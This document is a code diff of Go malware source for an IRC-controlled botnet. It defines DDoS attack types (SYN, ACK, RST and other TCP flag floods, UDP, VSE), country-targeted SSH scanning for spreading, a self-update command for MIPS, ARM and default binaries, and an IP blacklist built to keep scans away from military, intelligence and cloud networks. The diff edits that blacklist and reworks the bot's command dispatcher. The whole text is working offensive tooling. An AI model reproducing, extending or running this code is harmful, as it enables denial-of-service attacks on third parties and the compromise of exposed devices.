@@ -8,44 +8,38 @@ import (
 	"golang.org/x/crypto/ssh"
 )
 
-var BotReader, server *string
-var ChannelTopic []string //Just for a merge process.
-
-/*
-	These 2 variables doesn't merge with the bot structure because of a "fileName" function,
-	I want it to be a global function that every structure can access.
-*/
 var BotGroup, BotID string
+var BotReader, server *string
 
 type Bot struct {
-	CPU                   int
-	MipsArch, DefaultArch string
-	password, network     string
-	Channel, ChanKey      string
-	BotTag, BotHerder     string
-	ScanOpt, scanOptFull  string
-	tempIP                string
-	scanNetwork           []string
-	isRandom, scanSwitch  bool
-	IRC                   net.Conn
-	timeout               time.Duration
-	session               *ssh.Client
+	CPU                               int
+	DEFAULT_ARCH, MIPS_ARCH, ARM_ARCH string
+	password, network                 string
+	Channel, ChanKey                  string
+	BotTag, BotHerder                 string
+	ScanOpt, scanOptFull              string
+	tempIP                            string
+	scanNetwork                       []string
+	isRandom, scanSwitch              bool
+	IRC                               net.Conn
+	timeout                           time.Duration
+	session                           *ssh.Client
 }
 
 type Attack struct {
-	srcAddr, dstAddr, url                                string
-	dstPort                                              string
-	attackBody                                           io.Reader
-	flags                                                string
-	reportSwitch, attackSwitch                           bool
-	ddosPayload                                          []byte
-	synFlag, ackFlag, rstFlag, pshFlag, finFlag, urgFlag bool
+	srcAddr, dstAddr, url                                      string
+	dstPort                                                    string
+	attackBody                                                 io.Reader
+	flags                                                      string
+	reportSwitch, attackSwitch                                 bool
+	DDOS_PAYLOAD                                               []byte
+	SYN_FLAG, ACK_FLAG, RST_FLAG, PSH_FLAG, FIN_FLAG, URG_FLAG bool
 }
 
 type Exploit struct {
 	exploitName                                                     string
 	exploitBody                                                     io.Reader
-	exploitMethod, exploitHeader                                    string
+	exploitMethod, exploitPath                                      string
 	exploitAgent, exploitAccept, exploitContType, exploitConnection string
 }
 
@@ -56,61 +50,59 @@ type Caller struct {
 
 var ScanMap = map[string]Bot{
 	"-cn": {
-		scanNetwork: ChinaNetwork,
+		scanNetwork: China_Network,
 		scanOptFull: "\"CHINA\"",
 		isRandom:    false,
 	},
-	"-hk": {
-		scanNetwork: HongKongNetwork,
-		scanOptFull: "\"HONG KONG\"",
+	"-usa": {
+		scanNetwork: USA_Network,
+		scanOptFull: "\"U.S.A\"",
 		isRandom:    false,
 	},
 	"-kr": {
-		scanNetwork: KoreaNetwork,
+		scanNetwork: Korea_Network,
 		scanOptFull: "\"SOUTH KOREA\"",
 		isRandom:    false,
 	},
 	"-br": {
-		scanNetwork: BrazilNetwork,
+		scanNetwork: Brazil_Network,
 		scanOptFull: "\"BRAZIL\"",
 		isRandom:    false,
 	},
 	"-r": {
-		scanNetwork: RandomNetwork,
+		scanNetwork: Random_Network,
 		scanOptFull: "\"RANDOM\"",
 		isRandom:    true,
 	},
 }
 
-var TCPAttackMap = map[string]Attack{
+var TCP_ATTACK_MAP = map[string]Attack{
 	"-syn": {
-		synFlag: true,
+		SYN_FLAG: true,
 	},
 	"-ack": {
-		ackFlag: true,
+		ACK_FLAG: true,
 	},
 	"-rst": {
-		rstFlag: true,
+		RST_FLAG: true,
 	},
 	"-psh": {
-		pshFlag: true,
+		PSH_FLAG: true,
 	},
 	"-fin": {
-		finFlag: true,
+		FIN_FLAG: true,
 	},
 	"-urg": {
-		urgFlag: true,
+		URG_FLAG: true,
 	},
 }
 
 /*
-	Blacklist IP that will be skipped in the random scanning process. Skip since first network ID.
-	Some of these first network IDs may be anything not mentionally to be the thing that I have commented on because I skip since the first network ID.
-	I don't recommend you to write a map like this in Go, I do this because you know...
-	In my opinion, it looks cleaner than using an if statement with an "or" operator for this bunch of Blacklist IPs.
+	Blacklist IPs that will be skipped in the random scanning process. Skip since first network ID.
+	Some of these first network IDs may be anything not mentionally to be the thing that I have commented on,
+	because I skip since the first network ID.
 */
 var BlacklistIPs = map[string]struct{}{
-
 	/*
 		Loopback
 	*/
@@ -152,44 +144,9 @@ var BlacklistIPs = map[string]struct{}{
 	"224.": {},
 
 	/*
-		CIA
-	*/
-	"162.": {},
-
-	/*
 		Cloudflare
 	*/
 	"104.": {},
-
-	/*
-		NASA Kennedy Space Center
-	*/
-	"163.": {}, "164.": {},
-
-	/*
-		Naval Air Systems Command, VA
-	*/
-	"199.": {},
-
-	/*
-		Department of the Navy, Space and Naval Warfare System Command, Washington DC - SPAWAR
-	*/
-	"205.": {},
-
-	/*
-		FBI controlled Linux servers & IPs/IP-Ranges
-	*/
-	"207.": {},
-
-	/*
-		Amazon + Microsoft
-	*/
-	"13.": {}, "52.": {}, "54.": {},
-
-	/*
-		Ministry of Education Computer Science
-	*/
-	"120.": {}, "188.": {}, "78.": {},
 
 	/*
 		Total Server Solutions
@@ -207,12 +164,6 @@ var BlacklistIPs = map[string]struct{}{
 	"64.": {}, "185.": {}, "208.": {}, "209.": {}, "45.": {}, "66.": {}, "108.": {}, "216.": {},
 
 	/*
-		OVH
-	*/
-	"149.": {}, "151.": {}, "167.": {}, "176.": {}, "178.": {}, "37.": {}, "46.": {}, "51.": {},
-	"5.": {}, "91.": {},
-
-	/*
 		Department of Defense
 	*/
 	"6.": {}, "7.": {}, "11.": {}, "21.": {}, "22.": {}, "26.": {}, "28.": {}, "29.": {},
@@ -228,7 +179,7 @@ func SetupCaller() (Caller, bool) {
 					srcAddr:      Recv(*BotReader, 5),
 					dstAddr:      Recv(*BotReader, 6),
 					dstPort:      Recv(*BotReader, 7),
-					ddosPayload:  sockBuffer(Recv(*BotReader, 8)),
+					DDOS_PAYLOAD: sockBuffer(Recv(*BotReader, 8)),
 					attackSwitch: false,
 					reportSwitch: false,
 				},
@@ -236,32 +187,33 @@ func SetupCaller() (Caller, bool) {
 		}
 		value, key := CALL_5_ARG[SetupComd(3, ":")]
 		return value, key
-	} else if Find(*BotReader, "?udp") || Find(*BotReader, "?saf") || Find(*BotReader, "?xmas") {
+	} else if Find(*BotReader, "?udp") || Find(*BotReader, "?saf") || Find(*BotReader, "?xmas") || Find(*BotReader, "?scan") {
 		var CALL_4_ARG = map[string]Caller{
 			SetupComd(3, ":"): {
 				CallAttack: &Attack{
 					srcAddr:      Recv(*BotReader, 4),
 					dstAddr:      Recv(*BotReader, 5),
 					dstPort:      Recv(*BotReader, 6),
-					ddosPayload:  sockBuffer(Recv(*BotReader, 7)),
+					DDOS_PAYLOAD: sockBuffer(Recv(*BotReader, 7)),
 					attackSwitch: false,
 					reportSwitch: false,
+				},
+			},
+			"?scan": {
+				CallBot: &Bot{
+					ScanOpt:      Recv(*BotReader, 4),
+					DEFAULT_ARCH: Recv(*BotReader, 5),
+					MIPS_ARCH:    Recv(*BotReader, 6),
+					ARM_ARCH:     Recv(*BotReader, 7),
+					scanSwitch:   false,
 				},
 			},
 		}
 		value, key := CALL_4_ARG[SetupComd(3, ":")]
 		return value, key
-	} else if Find(*BotReader, "?scan") || Find(*BotReader, "?vse") {
+	} else if Find(*BotReader, "?vse") || Find(*BotReader, "?update") {
 		var CALL_3_ARG = map[string]Caller{
 			SetupComd(3, ":"): {
-				CallBot: &Bot{
-					ScanOpt:     Recv(*BotReader, 4),
-					DefaultArch: Recv(*BotReader, 5),
-					MipsArch:    Recv(*BotReader, 6),
-					scanSwitch:  false,
-				},
-			},
-			"?vse": {
 				CallAttack: &Attack{
 					srcAddr:      Recv(*BotReader, 4),
 					dstAddr:      Recv(*BotReader, 5),
@@ -270,10 +222,17 @@ func SetupCaller() (Caller, bool) {
 					reportSwitch: false,
 				},
 			},
+			"?update": {
+				CallBot: &Bot{
+					DEFAULT_ARCH: Recv(*BotReader, 4),
+					MIPS_ARCH:    Recv(*BotReader, 5),
+					ARM_ARCH:     Recv(*BotReader, 6),
+				},
+			},
 		}
 		value, key := CALL_3_ARG[SetupComd(3, ":")]
 		return value, key
-	} else if Find(*BotReader, "?fms") || Find(*BotReader, "?ipsec") || Find(*BotReader, "?update") {
+	} else if Find(*BotReader, "?fms") || Find(*BotReader, "?ipsec") {
 		var CALL_2_ARG = map[string]Caller{
 			SetupComd(3, ":"): {
 				CallAttack: &Attack{
@@ -281,12 +240,6 @@ func SetupCaller() (Caller, bool) {
 					dstAddr:      Recv(*BotReader, 5),
 					attackSwitch: false,
 					reportSwitch: false,
-				},
-			},
-			"?update": {
-				CallBot: &Bot{
-					DefaultArch: Recv(*BotReader, 4),
-					MipsArch:    Recv(*BotReader, 5),
 				},
 			},
 		}
@@ -339,10 +292,10 @@ func (b *Bot) ExecuteCaller() (func(), bool) {
 		"?poling":   b.POLING,
 		"?jumbo":    b.JUMBO,
 		"?get":      b.GET,
-		"?scan":     b.Scanner,
-		"?update":   b.Update,
-		"?info":     b.Information,
-		"?kill":     Kill,
+		"?scan":     b.scanner,
+		"?update":   b.update,
+		"?info":     b.information,
+		"?kill":     KILL,
 		"?stopddos": setAttackSwitch,
 		"?stopscan": setScanSwitch,
 	}
@@ -350,6 +303,4 @@ func (b *Bot) ExecuteCaller() (func(), bool) {
 	return value, key
 }
 
-func FunctionCaller(launch func()) {
-	go launch()
-}
+func FunctionCaller(launch func()) { go launch() }
